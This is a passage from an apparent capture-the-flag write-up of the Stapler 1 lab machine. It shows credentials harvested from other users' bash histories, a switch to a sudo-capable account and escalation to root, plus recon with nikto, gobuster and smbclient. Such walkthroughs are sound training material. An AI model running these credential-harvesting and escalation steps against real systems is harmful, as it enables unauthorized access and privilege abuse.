+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;SHayslett&nbsp;SHayslett&nbsp;3.7K&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bashrc<br>
+                drwx------&nbsp;&nbsp;2&nbsp;SHayslett&nbsp;SHayslett&nbsp;4.0K&nbsp;Apr&nbsp;13&nbsp;19<span style="color:#ff9d00;font-weight:700">:</span>07&nbsp;.cache<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;SHayslett&nbsp;SHayslett&nbsp;&nbsp;675&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.profile<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>SStroud<span style="color:#ff9d00;font-weight:700">:</span><br>
+                total&nbsp;24K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;2&nbsp;SStroud&nbsp;SStroud&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;32&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;4&nbsp;&nbsp;2016&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.bash_history<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;SStroud&nbsp;SStroud&nbsp;&nbsp;220&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bash_logout<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;SStroud&nbsp;SStroud&nbsp;3.7K&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bashrc<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;SStroud&nbsp;SStroud&nbsp;&nbsp;675&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.profile<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>Taylor<span style="color:#ff9d00;font-weight:700">:</span><br>
+                total&nbsp;24K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;2&nbsp;Taylor&nbsp;Taylor&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;32&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;4&nbsp;&nbsp;2016&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.bash_history<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;Taylor&nbsp;Taylor&nbsp;&nbsp;220&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bash_logout<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;Taylor&nbsp;Taylor&nbsp;3.7K&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bashrc<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;Taylor&nbsp;Taylor&nbsp;&nbsp;675&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.profile<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">:</span><br>
+                total&nbsp;24K<br>
+                drwxrwxrwx&nbsp;&nbsp;2&nbsp;www&nbsp;&nbsp;&nbsp;www&nbsp;&nbsp;&nbsp;4.0K&nbsp;Apr&nbsp;14&nbsp;13<span style="color:#ff9d00;font-weight:700">:</span>26&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;32&nbsp;root&nbsp;&nbsp;root&nbsp;&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;4&nbsp;&nbsp;2016&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;www&nbsp;&nbsp;&nbsp;www&nbsp;&nbsp;&nbsp;&nbsp;220&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bash_logout<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;www&nbsp;&nbsp;&nbsp;www&nbsp;&nbsp;&nbsp;3.7K&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bashrc<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;www&nbsp;&nbsp;&nbsp;www&nbsp;&nbsp;&nbsp;&nbsp;675&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.profile<br>
+                -rw-rw-rw-&nbsp;&nbsp;1&nbsp;mysql&nbsp;mysql&nbsp;&nbsp;&nbsp;28&nbsp;Apr&nbsp;14&nbsp;13<span style="color:#ff9d00;font-weight:700">:</span>26&nbsp;test.php<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>zoe<span style="color:#ff9d00;font-weight:700">:</span><br>
+                total&nbsp;24K<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;2&nbsp;zoe&nbsp;&nbsp;zoe&nbsp;&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;32&nbsp;root&nbsp;root&nbsp;4.0K&nbsp;Jun&nbsp;&nbsp;4&nbsp;&nbsp;2016&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;root&nbsp;root&nbsp;&nbsp;&nbsp;&nbsp;9&nbsp;Jun&nbsp;&nbsp;5&nbsp;&nbsp;2016&nbsp;.bash_history<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;zoe&nbsp;&nbsp;zoe&nbsp;&nbsp;&nbsp;220&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bash_logout<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;zoe&nbsp;&nbsp;zoe&nbsp;&nbsp;3.7K&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.bashrc<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;zoe&nbsp;&nbsp;zoe&nbsp;&nbsp;&nbsp;675&nbsp;Sep&nbsp;&nbsp;1&nbsp;&nbsp;2015&nbsp;.profile
+            </div>
+        </div><br>
+        <br>
+        You have read access to everyone's home directory and their respective .bash_history file.<br>
+        And it looks like <code>peter</code> has sudo rights.<br>
+        Have a read of those histories...<br>
+            <div class="codebox">
+                SHayslett@red<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>*<span style="color:#ff9d00;font-weight:700">/</span>.bash_history<br>
+                <span style="color:#ff9d00;font-weight:700">exit</span><br>
+                <span style="color:#ff9d00;font-weight:700">free</span><br>
+                <span style="color:#ff9d00;font-weight:700">exit</span><br>
+                <span style="color:#ff9d00;font-weight:700">exit</span><br>
+                <span style="color:#ff9d00;font-weight:700">exit</span><br>
+                <span style="color:#ff9d00;font-weight:700">exit</span><br>
+                <span style="color:#ff9d00;font-weight:700">exit</span><br>
+                <span style="color:#ff9d00;font-weight:700">exit</span><br>
+                <span style="color:#ff9d00;font-weight:700">exit</span><br>
+                <span style="color:#ff9d00;font-weight:700">exit</span><br>
+                top<br>
+                <span style="color:#ff9d00;font-weight:700">ps</span>&nbsp;aux<br>
+                <span style="color:#ff9d00;font-weight:700">exit</span><br>
+                <span style="color:#ff9d00;font-weight:700">exit</span><br>
+                <span style="color:#ff9d00;font-weight:700">exit</span><br>
+                <span style="color:#ff9d00;font-weight:700">id</span><br>
+                <span style="color:#ff9d00;font-weight:700">whoami</span><br>
+                <span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-lah<br>
+                <span style="color:#ff9d00;font-weight:700">pwd</span><br>
+                <span style="color:#ff9d00;font-weight:700">ps</span>&nbsp;aux<br>
+                sshpass&nbsp;-p&nbsp;thisimypassword&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span>&nbsp;JKanode@localhost<br>
+                apt-get&nbsp;<span style="color:#ff9d00;font-weight:700">install</span>&nbsp;sshpass<br>
+                sshpass&nbsp;-p&nbsp;JZQuyIN5&nbsp;peter@localhost<br>
+                <span style="color:#ff9d00;font-weight:700">ps</span>&nbsp;-ef<br>
+                top<br>
+                <span style="color:#ff9d00;font-weight:700">kill</span>&nbsp;-9&nbsp;3747<br>
+                <span style="color:#ff9d00;font-weight:700">exit</span><br>
+                <span style="color:#ff9d00;font-weight:700">exit</span><br>
+                <span style="color:#ff9d00;font-weight:700">exit</span><br>
+                <span style="color:#ff9d00;font-weight:700">exit</span><br>
+                <span style="color:#ff9d00;font-weight:700">exit</span><br>
+                <span style="color:#ff9d00;font-weight:700">whoami</span><br>
+                <span style="color:#ff9d00;font-weight:700">exit</span><br>
+                <span style="color:#ff9d00;font-weight:700">exit</span><br>
+                <span style="color:#ff9d00;font-weight:700">exit</span><br>
+                <span style="color:#ff9d00;font-weight:700">exit</span><br>
+                <span style="color:#ff9d00;font-weight:700">exit</span><br>
+                <span style="color:#ff9d00;font-weight:700">cat:</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>peter<span style="color:#ff9d00;font-weight:700">/</span>.bash_history<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Permission&nbsp;denied<br>
+                <span style="color:#ff9d00;font-weight:700">exit</span><br>
+                <span style="color:#ff9d00;font-weight:700">exit</span><br>
+                <span style="color:#ff9d00;font-weight:700">exit</span><br>
+                <span style="color:#ff9d00;font-weight:700">exit</span><br>
+                <span style="color:#ff9d00;font-weight:700">exit</span><br>
+                <span style="color:#ff9d00;font-weight:700">exit</span><br>
+                <span style="color:#ff9d00;font-weight:700">id</span><br>
+                top<br>
+                <span style="color:#ff9d00;font-weight:700">exit</span><br>
+            </div>
+        </div><br>
+        <br>
+        Looks like someone logged in as peter, which couldn't be more perfect.<br>
+        Peter's shell looks a little odd because he's using zsh and not the usual bash.<br>
+        <code>sudo -l</code> reveals that peter can run anything using sudo, so a <code>sudo su</code> will switch us to a root shell.<br>
+            <div class="codebox">
+                SHayslett@red<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">su</span>&nbsp;peter<br>
+                Password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;JZQuyIN5&nbsp;<br>
+                <br>
+                This&nbsp;is&nbsp;the&nbsp;Z&nbsp;Shell&nbsp;configuration&nbsp;<span style="color:#ff9d00;font-weight:700">function</span>&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">new</span>&nbsp;users,<br>
+                zsh-newuser-install.<br>
+                You&nbsp;are&nbsp;seeing&nbsp;this&nbsp;message&nbsp;because&nbsp;you&nbsp;have&nbsp;no&nbsp;zsh&nbsp;startup&nbsp;files<br>
+                (the&nbsp;files&nbsp;.zshenv,&nbsp;.zprofile,&nbsp;.zshrc,&nbsp;.zlogin&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;the&nbsp;directory<br>
+                ~).&nbsp;&nbsp;This&nbsp;<span style="color:#ff9d00;font-weight:700">function</span>&nbsp;can&nbsp;<span style="color:#ff9d00;font-weight:700">help</span>&nbsp;you&nbsp;with&nbsp;a&nbsp;few&nbsp;settings&nbsp;that&nbsp;should<br>
+                <span style="color:#ff9d00;font-weight:700">make</span>&nbsp;your&nbsp;use&nbsp;of&nbsp;the&nbsp;shell&nbsp;easier.<br>
+                <br>
+                You&nbsp;can<span style="color:#ff9d00;font-weight:700">:</span><br>
+                <br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">(</span>q<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;Quit&nbsp;and&nbsp;<span style="color:#ff9d00;font-weight:700">do</span>&nbsp;nothing.&nbsp;&nbsp;The&nbsp;<span style="color:#ff9d00;font-weight:700">function</span>&nbsp;will&nbsp;be&nbsp;run&nbsp;again&nbsp;next&nbsp;time.<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">(</span>0<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;Exit,&nbsp;creating&nbsp;the&nbsp;<span style="color:#ff9d00;font-weight:700">file</span>&nbsp;~<span style="color:#ff9d00;font-weight:700">/</span>.zshrc&nbsp;containing&nbsp;just&nbsp;a&nbsp;comment.<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;That&nbsp;will&nbsp;prevent&nbsp;this&nbsp;<span style="color:#ff9d00;font-weight:700">function</span>&nbsp;being&nbsp;run&nbsp;again.<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">(</span>1<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;Continue&nbsp;to&nbsp;the&nbsp;main&nbsp;menu.<br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">(</span>2<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;Populate&nbsp;your&nbsp;~<span style="color:#ff9d00;font-weight:700">/</span>.zshrc&nbsp;with&nbsp;the&nbsp;configuration&nbsp;recommended<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;by&nbsp;the&nbsp;system&nbsp;administrator&nbsp;and&nbsp;<span style="color:#ff9d00;font-weight:700">exit</span>&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>you&nbsp;will&nbsp;need&nbsp;to&nbsp;edit<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;the&nbsp;<span style="color:#ff9d00;font-weight:700">file</span>&nbsp;by&nbsp;hand,&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;so&nbsp;desired<span style="color:#ff9d00;font-weight:700">)</span>.<br>
+                <br>
+                ---&nbsp;Type&nbsp;one&nbsp;of&nbsp;the&nbsp;keys&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;parentheses&nbsp;---&nbsp;q<br>
+                red%&nbsp;<span style="color:#ff9d00;font-weight:700">id</span><br>
+                <span style="color:#7f0044;font-weight:400">uid</span>=1000<span style="color:#ff9d00;font-weight:700">(</span>peter<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;gid=1000<span style="color:#ff9d00;font-weight:700">(</span>peter<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">groups</span>=1000<span style="color:#ff9d00;font-weight:700">(</span>peter<span style="color:#ff9d00;font-weight:700">)</span>,4<span style="color:#ff9d00;font-weight:700">(</span>adm<span style="color:#ff9d00;font-weight:700">)</span>,24<span style="color:#ff9d00;font-weight:700">(</span>cdrom<span style="color:#ff9d00;font-weight:700">)</span>,27<span style="color:#ff9d00;font-weight:700">(sudo)</span>,30<span style="color:#ff9d00;font-weight:700">(</span>dip<span style="color:#ff9d00;font-weight:700">)</span>,46<span style="color:#ff9d00;font-weight:700">(</span>plugdev<span style="color:#ff9d00;font-weight:700">)</span>,110<span style="color:#ff9d00;font-weight:700">(</span>lxd<span style="color:#ff9d00;font-weight:700">)</span>,113<span style="color:#ff9d00;font-weight:700">(</span>lpadmin<span style="color:#ff9d00;font-weight:700">)</span>,114<span style="color:#ff9d00;font-weight:700">(</span>sambashare<span style="color:#ff9d00;font-weight:700">)</span><br>
+                red%&nbsp;<span style="color:#ff9d00;font-weight:700">sudo</span>&nbsp;-l<br>
+                <br>
+                We&nbsp;trust&nbsp;you&nbsp;have&nbsp;received&nbsp;the&nbsp;usual&nbsp;lecture&nbsp;from&nbsp;the&nbsp;<span style="color:#ff9d00;font-weight:700">local</span>&nbsp;System<br>
+                Administrator.&nbsp;It&nbsp;usually&nbsp;boils&nbsp;down&nbsp;to&nbsp;these&nbsp;three&nbsp;things<span style="color:#ff9d00;font-weight:700">:</span><br>
+                <br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#1)&nbsp;Respect&nbsp;the&nbsp;privacy&nbsp;of&nbsp;others.</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#2)&nbsp;Think&nbsp;before&nbsp;you&nbsp;type.</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#3)&nbsp;With&nbsp;great&nbsp;power&nbsp;comes&nbsp;great&nbsp;responsibility.</span><br>
+                <br>
+                [<span style="color:#ff9d00;font-weight:700">sudo</span>]&nbsp;password&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">peter</span>:&nbsp;JZQuyIN5&nbsp;<br>
+                Matching&nbsp;Defaults&nbsp;entries&nbsp;for&nbsp;peter&nbsp;on&nbsp;red:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;lecture=always,&nbsp;env_reset,&nbsp;mail_badpass,<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br>
+                <br>
+                User&nbsp;peter&nbsp;may&nbsp;run&nbsp;the&nbsp;following&nbsp;commands&nbsp;on&nbsp;red:<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;(ALL&nbsp;:&nbsp;ALL)&nbsp;ALL<br>
+                red%&nbsp;sudo&nbsp;su<br>
+                ➜&nbsp;&nbsp;SHayslett&nbsp;id<br>
+                uid=0(root)&nbsp;gid=0(root)&nbsp;groups=0(root)<br>
+                ➜&nbsp;&nbsp;SHayslett&nbsp;cd&nbsp;/root<br>
+                ➜&nbsp;&nbsp;~&nbsp;ls<br>
+                fix-wordpress.sh&nbsp;&nbsp;flag.txt&nbsp;&nbsp;issue&nbsp;&nbsp;python.sh&nbsp;&nbsp;wordpress.sql<br>
+                ➜&nbsp;&nbsp;~&nbsp;cat&nbsp;flag.txt<br>
+                ~~~~~~~~~~&lt;(Congratulations)&gt;~~~~~~~~~~<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.-'''''-.<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|'-----'|<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|-.....-|<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_,._&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;__.o`&nbsp;&nbsp;&nbsp;o`"-.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
+                &nbsp;.-O&nbsp;o&nbsp;`"-.o&nbsp;&nbsp;&nbsp;O&nbsp;)_,._&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
+                (&nbsp;o&nbsp;&nbsp;&nbsp;O&nbsp;&nbsp;o&nbsp;)--.-"`O&nbsp;&nbsp;&nbsp;o"-.`'-----'`<br>
+                &nbsp;'--------'&nbsp;&nbsp;(&nbsp;&nbsp;&nbsp;o&nbsp;&nbsp;O&nbsp;&nbsp;&nbsp;&nbsp;o)&nbsp;&nbsp;<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;`----------`<br>
+                b6b545dc11b7a270f4bad23432190c75162c4a2b<br>
+                <br>
+                ➜&nbsp;&nbsp;~&nbsp;
+            </div>
+        </div><br>
+        <br>
+        <br>
+        <a id="h1-2" name="h1-2"></a><strong></strong>
+        <h1><strong>x) Rabbit holes</strong></h1><br>
+        A writeup of this box makes it sound so simple, but there's a ton of information to sift through and poke at. Which is why I've decided to write about the rabbit holes I fell down too.<br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>Gaining access</strong></h2><br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>Rabbit hole #1 - 80/http</strong></h3><br>
+        I looked around at 80/http manually, nothing really stood out. I googled about the php cli server, thought I might be able to get command execution but couldn't find anything. I ran some tools on it:<br>
+        <br>
+        <code>wafw00f http://192.168.1.237<br></code> said there was a firewall?? didn't make much sense to me<code><br>
+        nikto -h http://192.168.1.237 -o nikto.txt<br></code> local file inclusion of /.bashrc and /.profile but couldn't manage to get any other files<code><br>
+        gobuster -e -u http://192.168.1.237/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -o gb-common.txt<br></code> found what nikto found<code><br>
+        gobuster -e -u http://192.168.1.237/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -o gb-big.txt<br></code> also found what nikto found<code><br>
+        mkdir skipfish1 ; skipfish -o skipfish1 http://192.168.1.237/<br></code> nothing new<code><br>
+        uniscan -u http://192.168.1.237/ -qweds</code><br>
+        and nothing new here either<br>
+        <br>
+        I had no idea what to do :/<br>
+        <br>
+        <a id="h3-3" name="h3-3"></a><strong></strong>
+        <h3><strong>Rabbit hole #2 - 139/samba</strong></h3><br>
+        Checking out samba:<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>stapler1<span style="color:#ff9d00;font-weight:700">/</span>139samba#&nbsp;smbclient&nbsp;-L&nbsp;192.168.1.237<br>
+                Enter&nbsp;WORKGROUP<span style="color:#333333;font-weight:400">\r</span>oot<span style="color:#3ad900;font-weight:400">'s&nbsp;password:&nbsp;<br>
+                <br>
+                Sharename&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Type&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Comment<br>
+                ---------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-------<br>
+                print$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disk&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Printer&nbsp;Drivers<br>
+                kathy&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disk&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Fred,&nbsp;What&nbsp;are&nbsp;we&nbsp;doing&nbsp;here?</span><br>
+                <span style="color:#3ad900;font-weight:400">tmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disk&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;All&nbsp;temporary&nbsp;files&nbsp;should&nbsp;be&nbsp;stored&nbsp;here<br>
+                IPC$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IPC&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IPC&nbsp;Service&nbsp;(red&nbsp;server&nbsp;(Samba,&nbsp;Ubuntu))<br>
+                Reconnecting&nbsp;with&nbsp;SMB1&nbsp;for&nbsp;workgroup&nbsp;listing.<br>
+                <br>
+                Server&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Comment<br>
+                ---------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-------<br>
+                <br>
+                Workgroup&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Master<br>
+                ---------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-------<br>
+                HOME&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PNHUB1<br>
+                WORKGROUP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RED</span>
+            </div>
+        </div><br>
+        <br>
+        Kathy leaves a bit of a trail in the samba share. It's not entirely a rabbit hole, as it gave me a hint towards looking for a wordpress site as well to find the wordpress configuration once on the machine.<br>
+            <div class="codebox">
+                root@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>stapler1<span style="color:#ff9d00;font-weight:700">/</span>139samba#&nbsp;smbclient&nbsp;<span style="color:#ff9d00;font-weight:700">//</span>192.168.1.237<span style="color:#ff9d00;font-weight:700">/</span>kathy<br>
+                Enter&nbsp;WORKGROUP<span style="color:#333333;font-weight:400">\r</span>oots&nbsp;password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<br>
+                Try&nbsp;<span style="color:#3ad900;font-weight:400">"help"</span>&nbsp;to&nbsp;get&nbsp;a&nbsp;list&nbsp;of&nbsp;possible&nbsp;commands.<br>
+                smb<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;<span style="color:#333333;font-weight:400">\&gt;</span>&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span><br>
